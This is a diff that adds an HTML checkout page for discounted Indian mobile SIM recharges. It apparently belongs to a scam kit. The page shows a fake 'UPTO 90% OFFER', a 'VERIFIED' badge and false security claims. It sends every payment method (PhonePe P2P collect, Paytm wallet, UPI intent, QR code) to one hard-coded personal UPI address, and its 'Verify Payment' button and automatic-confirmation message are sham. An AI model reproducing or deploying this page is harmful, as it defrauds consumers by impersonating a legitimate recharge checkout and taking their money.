@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Payment Gateway</title>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J8CJT7PL1X"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-J8CJT7PL1X');</script>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{width:100%;min-height:100%;overflow-x:hidden}
+  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#e9defc 0%,#f4f2f7 55%,#eeecf2 100%);font-family:'Sora',-apple-system,sans-serif;min-height:100vh;min-height:100dvh;display:flex;justify-content:center;align-items:flex-start;padding:30px 16px 40px}
+  .card{width:100%;max-width:420px;min-height:100vh;min-height:100dvh;background:#fbfaff;border-radius:34px;position:relative;overflow:hidden;box-shadow:0 40px 80px -34px rgba(58,26,110,.45),0 0 0 1px rgba(109,40,217,.07);animation:slideFwd .26s cubic-bezier(.22,.7,.3,1) both}
+  .card > :first-child{padding-top:calc(22px + env(safe-area-inset-top)) !important}
+  .card > :last-child{padding-bottom:calc(28px + env(safe-area-inset-bottom)) !important}
+  button{min-height:44px;font:inherit;touch-action:manipulation}
+  input{font-size:16px !important}
+  #methods{min-width:0;max-width:100%;overflow-x:hidden}
+  #qrbox{max-width:100%;overflow:hidden}
+  #qrbox img,#qrbox canvas{display:block;width:min(210px,calc(100vw - 96px)) !important;height:auto !important;aspect-ratio:1/1}
+  .btn-grad{background:linear-gradient(140deg,#7c3aed,#5b21b6);box-shadow:0 14px 24px -14px rgba(109,40,217,.9)}
+  a{color:#6d28d9;text-decoration:none}a:hover{color:#55208f}
+  @keyframes slideFwd{from{opacity:0;transform:translateX(26px)}to{opacity:1;transform:translateX(0)}}
+  @keyframes qrspin{to{transform:rotate(360deg)}}
+  @keyframes qrpulse{0%,100%{opacity:.5}50%{opacity:1}}
+  #qrbox img,#qrbox canvas{display:block;width:198px !important;height:198px !important}
+  @media (max-width:640px){
+    body{padding:0;background:#fff}
+    .card{max-width:100%;border-radius:0;min-height:100vh;min-height:100dvh;box-shadow:none}
+    .topbar{padding-top:calc(20px + env(safe-area-inset-top))}
+  }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="topbar" style="display:flex;align-items:center;gap:13px;padding:20px 20px 4px">
+      <button onclick="location.href='plans.html'" style="display:grid;place-items:center;width:36px;height:36px;border:none;border-radius:12px;background:#fff;color:#6d28d9;font-size:16px;cursor:pointer;box-shadow:0 6px 14px -8px rgba(58,26,110,.5)"><i class="fa-solid fa-arrow-left"></i></button>
+      <span style="flex:1;font-size:17px;font-weight:600;color:#1e1233;letter-spacing:-.3px">Payment Gateway</span>
+      <span style="display:inline-flex;align-items:center;gap:6px;padding:8px 13px;border-radius:999px;background:#fff;color:#6d28d9;font-size:12.5px;font-weight:600;box-shadow:0 6px 14px -8px rgba(58,26,110,.5)"><i class="fa-regular fa-clock"></i><span id="timer">05:00</span></span>
+    </div>
+
+    <!-- Amount card -->
+    <div style="position:relative;margin:16px 18px 0;padding:20px;border-radius:24px;overflow:hidden;background:radial-gradient(300px 200px at 90% 0%,#a855f7 0%,rgba(168,85,247,0) 65%),linear-gradient(150deg,#6d28d9,#4c1d95);box-shadow:0 24px 46px -24px rgba(76,29,149,.85)">
+      <div style="position:absolute;top:-50px;right:-40px;width:150px;height:150px;border-radius:50%;background:rgba(255,255,255,.07)"></div>
+      <div style="position:relative;display:flex;align-items:flex-start;justify-content:space-between;gap:12px">
+        <div>
+          <div style="font-size:10px;font-weight:600;letter-spacing:1px;color:rgba(255,255,255,.7)">PAYABLE AMOUNT</div>
+          <div style="margin-top:6px;font-size:38px;font-weight:700;color:#fff;line-height:1;letter-spacing:-1.6px">₹<span id="amount">399</span></div>
+        </div>
+        <span style="display:inline-block;font-size:9px;font-weight:700;letter-spacing:.5px;color:#4c1d95;background:#fff;padding:5px 10px;border-radius:999px;white-space:nowrap">SPECIAL ACTIVE OFFER</span>
+      </div>
+      <div style="position:relative;margin-top:18px;padding-top:14px;border-top:1px solid rgba(255,255,255,.15);display:flex;align-items:center;justify-content:space-between;gap:10px">
+        <span id="planSummary" style="font-size:12px;font-weight:500;color:rgba(255,255,255,.82)">1 Year · 2.5 GB/day</span>
+        <span id="opPill" style="display:inline-flex;align-items:center;padding:6px 12px;border-radius:999px;background:#e21b22;color:#fff;font-size:10.5px;font-weight:700;letter-spacing:.5px;box-shadow:0 0 0 1px rgba(255,255,255,.35)">JIO</span>
+      </div>
+      <div id="phone" style="position:relative;margin-top:10px;font-size:12px;font-weight:500;color:rgba(255,255,255,.62)">+91 65678 76543</div>
+    </div>
+
+    <!-- Offer strip -->
+    <div style="margin:12px 18px 0;padding:12px 15px;border-radius:16px;background:#f6f1fe;display:flex;align-items:center;gap:10px">
+      <span style="width:6px;height:6px;border-radius:50%;background:#6d28d9"></span>
+      <span style="flex:1;font-size:12px;font-weight:600;letter-spacing:.3px;color:#6d28d9">UPTO 90% OFFER IS LIVE</span>
+      <span style="font-size:9px;font-weight:700;letter-spacing:.5px;color:#fff;background:#6d28d9;padding:5px 10px;border-radius:999px">✓ VERIFIED</span>
+    </div>
+
+    <div style="padding:22px 18px 6px;display:flex;align-items:baseline;justify-content:space-between">
+      <span style="font-size:15px;font-weight:600;color:#1e1233">UPI</span>
+      <span style="font-size:11.5px;color:#8b83a3">Pay by any UPI app</span>
+    </div>
+
+    <div id="methods" style="margin:8px 18px 0;background:#fff;border-radius:22px;overflow:hidden;box-shadow:0 18px 38px -28px rgba(58,26,110,.45),0 0 0 1px rgba(109,40,217,.06)"></div>
+
+    <div style="padding:24px 24px calc(28px + env(safe-area-inset-bottom));display:flex;align-items:center;justify-content:center;gap:8px;font-size:11.5px;font-weight:500;color:#16a34a">
+      <span style="display:grid;place-items:center;width:15px;height:15px;border-radius:5px;background:#16a34a;color:#fff;font-size:9px">✓</span>
+      100% Secure 256-bit Encrypted Connection
+    </div>
+  </div>
+
+<script>
+var amount=localStorage.getItem('recharge_amount')||'399';
+document.getElementById('amount').textContent=amount;
+var num=localStorage.getItem('recharge_mobile')||'6567876543';
+if(num.length===10) document.getElementById('phone').textContent='+91 '+num.slice(0,5)+' '+num.slice(5);
+var pv=localStorage.getItem('recharge_plan_validity')||'1 Year';
+var pd=localStorage.getItem('recharge_plan_data')||'2.5 GB/day';
+document.getElementById('planSummary').textContent = pv+' \u00B7 '+pd;
+var OPCOL={Jio:['#e21b22','#fff'],Airtel:['#fff','#e40000'],Vi:['#e60000','#fff'],BSNL:['#fff','#1a6bb0']};
+(function(){var op=localStorage.getItem('recharge_operator')||'Jio',c=OPCOL[op]||OPCOL.Jio,p=document.getElementById('opPill');p.textContent=op.toUpperCase();p.style.background=c[0];p.style.color=c[1];})();
+
+/* Logo files must sit in the SAME folder as the HTML files */
+var METHODS=[
+ {id:'phonepe',name:'PhonePe',logo:'phonepe.webp',fit:'cover'},
+ {id:'paytm',name:'Paytm',logo:'paytm.png',fit:'contain',white:true},
+ {id:'qr',name:'Pay via QR Code',qr:true},
+ {id:'other',name:'Pay via Other UPI',logo:'upi.webp',fit:'contain'}
+];
+var selected='phonepe';
+var selectedApp='phonepe';
+var upiAddress='paytm.s1lb3d6@pty';
+var merchantName='SIM Recharge';
+var trId='';
+for(var ti=0;ti<13;ti++) trId+=Math.floor(Math.random()*10).toString();
+
+function icon(m){
+  if(m.qr){
+    return '<span style="display:grid;place-items:center;width:38px;height:38px;border-radius:12px;background:linear-gradient(140deg,#7c3aed,#5b21b6);flex-shrink:0;color:#fff"><i class="fa-solid fa-qrcode"></i></span>';
+  }
+  return '<span style="display:block;width:38px;height:38px;border-radius:12px;overflow:hidden;flex-shrink:0;background:'+(m.white?'#fff':'transparent')+';box-shadow:'+(m.white?'0 0 0 1px #eeeaf6':'none')+'"><img src="'+m.logo+'" alt="'+m.name+'" style="display:block;width:100%;height:100%;object-fit:'+m.fit+'"></span>';
+}
+function dot(a){ return '<span style="width:19px;height:19px;border-radius:50%;border:'+(a?'6px solid #7c3aed':'1.5px solid #ddd6ea')+';background:#fff;flex-shrink:0;transition:all .15s"></span>'; }
+
+function renderMethods(){
+  document.getElementById('methods').innerHTML=METHODS.map(function(m,i){
+    var a=m.id===selected;
+    var row='<button onclick="selectUpiOption(\''+m.id+'\')" style="width:100%;display:flex;align-items:center;gap:13px;padding:15px 16px;border:none;border-top:'+(i===0?'none':'1px solid #f3f0f9')+';background:transparent;font-family:inherit;cursor:pointer">'+icon(m)
+      +'<span style="flex:1;text-align:left;font-size:14.5px;font-weight:600;color:#1e1233">'+m.name+'</span>'+dot(a)+'</button>';
+    var extra='';
+    if(a&&m.qr){
+      extra='<div style="margin:0 12px 14px;padding:20px 16px;border-radius:20px;background:linear-gradient(180deg,#faf7ff,#f4effe);text-align:center">'
+       +'<div style="font-size:10.5px;font-weight:700;letter-spacing:.8px;color:#6d28d9">SCAN THIS QR TO MAKE PAYMENT</div>'
+       +'<div style="margin-top:5px;font-size:11.5px;font-weight:600;color:#dc2657">Expires in <span id="qrtimer">'+fmt(seconds)+'</span></div>'
+       +'<div style="display:inline-block;margin-top:15px;padding:14px;background:#fff;border-radius:20px;box-shadow:0 16px 30px -16px rgba(58,26,110,.5)"><div id="qrbox"></div></div>'
+       +'<div style="margin-top:13px;display:flex;align-items:center;justify-content:center;gap:6px;flex-wrap:wrap;font-size:12px;font-weight:500;color:#7d7593">Scan &amp; pay with <img src="phonepe.webp" alt="PhonePe" style="width:22px;height:22px;border-radius:50%;object-fit:contain;"><img src="paytm.png" alt="Paytm" style="width:22px;height:22px;border-radius:50%;object-fit:contain;background:#fff;"><img src="upi.webp" alt="UPI" style="width:22px;height:22px;border-radius:50%;object-fit:contain;"> any UPI app</div>'
+       +'<button class="btn-grad" onclick="executeIntent(\'qr\')" style="width:100%;margin-top:15px;border:none;border-radius:15px;padding:15px 0;font-family:inherit;font-weight:600;font-size:14.5px;color:#fff;cursor:pointer">Verify Payment</button>'
+       +'<div style="margin-top:14px;display:flex;align-items:center;justify-content:center;gap:9px"><span style="width:15px;height:15px;border:2px solid #ded1f7;border-top-color:#6d28d9;border-radius:50%;animation:qrspin .8s linear infinite;display:inline-block"></span>'
+       +'<span style="font-size:12px;font-weight:500;color:#6d28d9;animation:qrpulse 1.6s ease-in-out infinite">Waiting for payment\u2026 we\u2019ll confirm automatically</span></div></div>';
+    } else if(a){
+      extra='<div style="padding:0 16px 16px"><button class="btn-grad" onclick="executeIntent(\''+m.id+'\')" style="width:100%;border:none;border-radius:15px;padding:15px 0;font-family:inherit;font-weight:600;font-size:14.5px;color:#fff;cursor:pointer">Pay via '+m.name+'</button></div>';
+    }
+    return '<div>'+row+extra+'</div>';
+  }).join('');
+  if(selected==='qr') drawQR();
+}
+
+function selectUpiOption(id){
+  selected=id;
+  selectedApp=id==='other'?'all':id;
+  if(id==='qr'){ seconds=300; startTimer(); } else { stopTimer(); }
+  renderMethods();
+}
+
+function executeIntent(method){
+  var app=method||selectedApp;
+  if(!app)return;
+  var initialAmountInPaise=Math.round(Number(amount)*100);
+  var noteMsg='RC'+new Date().toISOString().replace(/[-:T.Z]/g,'').slice(0,14);
+  if(app==='phonepe'){
+    var p2pPayload={p2pPaymentCheckoutParams:{checkoutType:'COLLECT',initialAmount:initialAmountInPaise,note:{type:'text',message:noteMsg},supportedInstruments:-1},contact:{type:'EXTERNAL_MERCHANT',name:merchantName,vpa:upiAddress}};
+    var base64Data=btoa(JSON.stringify(p2pPayload));
+    window.location.href='phonepe://native?data='+base64Data+'&id=p2ppayment';
+  }else if(app==='paytm'){
+    window.location.href='paytmmp://cash_wallet?pa='+upiAddress+'&am='+Number(amount).toFixed(2)+'&pn='+encodeURIComponent(merchantName)+'&cu=INR';
+  }else{
+    window.location.href='upi://pay?pa='+encodeURIComponent(upiAddress)+'&pn='+encodeURIComponent(merchantName)+'&am='+Number(amount).toFixed(2)+'&cu=INR&mode=02&tr='+encodeURIComponent(trId);
+  }
+}
+
+function drawQR(){
+  var box=document.getElementById('qrbox'); if(!box||!window.QRCode) return;
+  box.innerHTML='';
+  new QRCode(box,{text:'upi://pay?pa='+encodeURIComponent(upiAddress)+'&pn='+encodeURIComponent(merchantName)+'&am='+Number(amount).toFixed(2)+'&cu=INR&mode=02&tr='+trId,width:210,height:210,colorDark:'#4c1d95',colorLight:'#ffffff',correctLevel:QRCode.CorrectLevel.H});
+}
+
+var seconds=300,tId=null;
+function fmt(s){return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0');}
+function startTimer(){stopTimer();document.getElementById('timer').textContent=fmt(seconds);tId=setInterval(function(){if(seconds>0)seconds--;document.getElementById('timer').textContent=fmt(seconds);var q=document.getElementById('qrtimer');if(q)q.textContent=fmt(seconds);},1000);}
+function stopTimer(){if(tId){clearInterval(tId);tId=null;}}
+
+renderMethods();
+</script>
+</body>
+</html>
